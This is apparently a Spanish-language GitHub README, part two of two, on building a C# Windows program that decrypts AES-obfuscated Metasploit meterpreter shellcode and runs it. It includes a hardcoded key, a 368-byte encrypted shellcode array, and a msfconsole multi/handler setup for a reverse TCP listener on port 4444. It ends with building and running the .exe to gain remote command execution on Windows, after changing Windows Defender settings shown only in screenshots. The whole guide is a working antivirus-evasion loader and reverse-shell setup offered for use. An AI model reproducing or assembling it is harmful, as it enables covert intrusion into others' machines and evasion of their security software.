Desencriptar shell code AES creado anterior mente con el script "Ofuscar-shell-meterpreter-en-AES PARTE 2 DE 2" 

Este es el script que nos permitira desencriptar el shell code ofuscado con el script anterior   !! necesitamos usar visual studio code 2015 - 2022 !!

1. tenemos que abrir un nuevo proyecto de windows form en csharp
2. despues de abirse hay que eliminar el windows form
3. configuracion de propiedades para eso hay que ir al solucion explorer y darle doble click en propiedades, en la parte de Output lo dejamos como Windows Aplication"
4. En la parte del targetFramework escogemos .NET Framework 4.7.2
5. ![imagen](https://github.com/Cristian-M0ntes/Desencriptar-shell-code-AES-/assets/79603479/2653a2e8-655e-484c-bb1b-f2ed96619e06)
6. en el archivo program.cs metemos el codigo de "encriptar shell metasploit to AES.txt"
7. despues cambiamor la parte de
8.             byte[] clave_aleatoria_bytes = Encoding.UTF8.GetBytes("G/!gvkxJF!GJ&wQpG&3H");
9. donde remplazaras lo que esta en comillas por la clave aleatoria antes generada
10. en el renglon de abajo se muesta la linea donde necesitamos "cambiar" el shell anterior mente encriptado con el script 1 de 2 por el que guardamos anterior mente teniendo como resultado 368 bytes 
12.     byte[] shellcode_metasploit_aes = new byte[368] { 0xda, 0xe1, 0x9f, 0x6b, 0x10, 0xa7, 0x69, 0x3d, 0xe5, 0x33, 0xf5, 0xed, 0x5c, 0x0a, 0x9a, 0x13, 0x04, 0xa2, 0xea, 0xd1, 0x28, 0xf0, 0xc3, 0xda, 0x3b, 0x3c, 0x80, 0x61, 0xc8, 0x52, 0xd8, 0xaa, 0x4c, 0x3e, 0xd5, 0xef, 0xd0, 0xa3, 0x53, 0x21, 0x74, 0xfc, 0xa3, 0x21, 0x90, 0x2c, 0x46, 0xdd, 0xed, 0x1d, 0x50, 0xf6, 0x7b, 0x4e, 0xb6, 0x87, 0x50, 0x5a, 0x40, 0x9b, 0xcb, 0x72, 0x21, 0x22, 0xee, 0x68, 0xd6, 0x64, 0xf8, 0x4f, 0xe2, 0xed, 0x97, 0x53, 0x9f, 0x72, 0x48, 0x1e, 0x8d, 0x38, 0xbc, 0x05, 0x6b, 0x63, 0x7c, 0x85, 0x26, 0x3b, 0x43, 0x4e, 0x24, 0x70, 0xb9, 0x13, 0xac, 0x9d, 0x18, 0x5d, 0xf6, 0x3e, 0x6a, 0xf5, 0x5e, 0xbd, 0x8e, 0x55, 0xc6, 0x4c, 0x45, 0x7b, 0x4d, 0x32, 0xc5, 0x56, 0x31, 0x81, 0xeb, 0x96, 0xfd, 0x4a, 0x49, 0xfa, 0xd2, 0x0c, 0x56, 0x1b, 0xf2, 0xe1, 0x44, 0xce, 0x5a, 0xdc, 0x36, 0x17, 0xf5, 0x87, 0x52, 0x4e, 0xe9, 0xf1, 0x09, 0x28, 0x90, 0xe2, 0x5f, 0x2f, 0x66, 0x64, 0x36, 0x4e, 0x60, 0x36, 0x84, 0x90, 0x45, 0x95, 0x23, 0xe6, 0x4e, 0xf4, 0xf1, 0xd9, 0x90, 0x2b, 0x8e, 0x91, 0xe1, 0x24, 0x2b, 0xc8, 0xdd, 0xc0, 0xf6, 0x4c, 0x95, 0x61, 0xa3, 0xeb, 0x37, 0x75, 0xed, 0x17, 0x44, 0xa2, 0x06, 0xbd, 0x9a, 0x16, 0x0f, 0xfc, 0x9a, 0x57, 0xe2, 0xbe, 0xd2, 0x82, 0xec, 0x8c, 0x79, 0x32, 0x72, 0xd0, 0x3a, 0x68, 0x9f, 0x35, 0xa8, 0x85, 0x6b, 0x3c, 0xd9, 0x37, 0x98, 0xbd, 0xfd, 0xdc, 0x55, 0xa4, 0x4b, 0xd8, 0xf2, 0x59, 0x9c, 0x7d, 0xec, 0xf2, 0x35, 0xbe, 0xb3, 0xaa, 0x7f, 0x9a, 0x86, 0xf6, 0x7a, 0x42, 0xcf, 0xb2, 0xaa, 0xc3, 0x58, 0xa1, 0xb2, 0x0a, 0x57, 0xd2, 0x75, 0x7b, 0x2f, 0x1d, 0x71, 0x7c, 0xf1, 0x63, 0x24, 0x64, 0x6f, 0x38, 0x3c, 0x37, 0x93, 0xda, 0x7e, 0x74, 0x7c, 0x59, 0x04, 0xe1, 0x9c, 0x99, 0xb6, 0x2f, 0xe8, 0x52, 0xc9, 0x91, 0x34, 0x30, 0xaa, 0xa9, 0x71, 0xcf, 0xe5, 0xcf, 0x21, 0xc5, 0x17, 0x4d, 0xfb, 0x6e, 0x89, 0xe5, 0x88, 0x09, 0xe4, 0x50, 0x2e, 0x4c, 0x50, 0x32, 0x85, 0x7a, 0x77, 0x74, 0xd3, 0xfb, 0x86, 0xa9, 0x75, 0x50, 0xf7, 0x80, 0xb8, 0xca, 0x69, 0x5a, 0xe8, 0xed, 0xb5, 0xec, 0x5a, 0x53, 0x57, 0xf7, 0xde, 0xa8, 0xe6, 0xbf, 0x41, 0xbb, 0x46, 0x5f, 0x07, 0x07, 0x54, 0x4c, 0xbd, 0xb5, 0x86, 0xd2, 0x9e, 0x9f, 0x9c, 0x7d, 0x52, 0x5a, 0x09, 0x87, 0xa2, 0x9f, 0x2e, 0xcb, 0x6d, 0xdd, 0xd3, 0xf0, 0xb0, 0x24, 0xfe, 0x19, 0x61, 0x89, 0x29, 0x76, 0x42, 0xee, 0xfa, 0x81 };
13. despues de haber cambiado los parametros anteriores con los nuevos valores necesitamos ir al solucion explorer
14. donde escogeremos add new class como se muestra en la imagen de abajo 
14.![imagen](https://github.com/Cristian-M0ntes/Desencriptar-shell-code-AES-/assets/79603479/20aa8cc3-6a99-4fab-b8d4-f55af023ff9d)
15. al momento de crear la nueva clase necesitamos llamarla como " librerias_carga_memoria " ya que este es el nombre de la variable que se encuentra en el script program.cs
16. meteremos el codigo del archivo " Desencriptar shell code AES clase nueva.txt " viendose como en la imagen de abajo 

11. ![imagen](https://github.com/Cristian-M0ntes/Desencriptar-shell-code-AES-/assets/79603479/b0dd7806-a5dd-4a42-b851-3a06956d17f6)
12. teniendo todo esto configurado necesitamos crear un listening de metasploit para recoger la comunicacion usando el siguiente codigo
13. en linux creas un archivo llamado handler.rc escribiendo los siguientes comandos

        use multi/handler
        set payload windows/meterpreter/reverse_tcp
        set lhost <TU IP >
        set lport 4444
        set ExitOnSession false
        exploit -j

14. luego ejecutaremos ese archivo llamado handler.rc con el siguiente comando
15.     sudo msfconsole -r handler.rc
16. una vez echo esto hay que ir a windows donde configuraras el windows defender de la siguiente manera 
17. ![imagen](https://github.com/Cristian-M0ntes/Desencriptar-shell-code-AES-/assets/79603479/072075e9-8a23-43b7-8f56-dbbe1519855c)
18. ![imagen](https://github.com/Cristian-M0ntes/Desencriptar-shell-code-AES-/assets/79603479/396e8ba0-1ebe-4250-8b11-4b3ddc7928ee)
19. en este paso solo queda contruir "build" el script esto creara un .exe que ejecutaremos para conseguir la conexion reversa hacia nuestro linux que previamente configuramos
20. si al ejecutar el .exe siguiendo estos pasos se abre una shell de meterpreter entonces estaremos dentro de windows desde linux, para verificar esto usamos
21.     sysinfo 
22. con esto podremos haber comprobado que el que estamos dentro de windows y podremos ejecutar comandos  por lo que la meta se habra cumplido 



